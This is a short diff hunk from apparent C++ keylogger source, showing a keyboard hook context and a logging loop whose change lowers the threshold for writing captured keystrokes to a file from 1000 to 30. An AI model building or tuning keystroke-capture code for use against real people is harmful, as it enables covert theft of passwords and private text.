@@ -92,7 +92,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 void writeLogToFile() {
 	while (true) {
 		Sleep(30000);
-		if (loggedKeys.size() >= 1000) {
+		if (loggedKeys.size() >= 30) {
 			utilClass.writeLogToFile(loggedKeysMap);
 			loggedKeysMap.clear();
 			loggedKeys.clear();
